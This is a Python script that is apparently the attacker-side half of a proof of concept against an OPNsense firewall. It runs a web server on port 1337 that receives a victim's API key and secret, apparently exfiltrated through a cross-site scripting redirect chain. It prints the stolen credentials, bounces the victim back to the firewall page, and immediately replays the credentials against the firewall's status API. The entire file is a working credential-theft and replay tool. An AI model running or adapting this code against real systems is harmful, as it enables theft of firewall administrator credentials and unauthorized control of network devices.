#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, json, urllib3, requests

urllib3.disable_warnings()

TARGET = "https://192.168.1.1"
DEMO = "/api/core/system/status"
BOUNCE = "https://192.168.1.1/services_ntpd_gps.php"


class AttackerWebServer(BaseHTTPRequestHandler):
    def do_GET(self):
        raw = urllib.parse.urlparse(self.path).query
        raw = raw.split("=", 1)[1] if "=" in raw else raw
        creds = urllib.parse.unquote(raw)

        # bounce the victim back immediately
        self.send_response(302)
        self.send_header("Location", BOUNCE)
        self.end_headers()

        if ":" not in creds:
            print("\n[?] non-credential hit: " + creds)
            return
        key, secret = creds.split(":", 1)
        print("\n" + "=" * 70)
        print("[+] CAPTURED OPNsense API CREDENTIAL")
        print("    API key   : " + key)
        print("    API secret: " + secret)

        # Authenticated Test Request with captured credentials
        try:
            r = requests.get(
                TARGET + DEMO, auth=(key, secret), verify=False, timeout=10
            )
            print("\n[+] REPLAYED FROM ATTACKER BOX  ->  GET " + DEMO)
            print("    HTTP " + str(r.status_code))
            try:
                print(json.dumps(r.json(), indent=2)[:4000])
            except ValueError:
                print(r.text[:2000])
        except Exception as e:
            print("[-] replay failed: " + str(e))
        print("=" * 70)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    print("[*] listening on 0.0.0.0:1337 ...")
    HTTPServer(("0.0.0.0", 1337), AttackerWebServer).serve_forever()
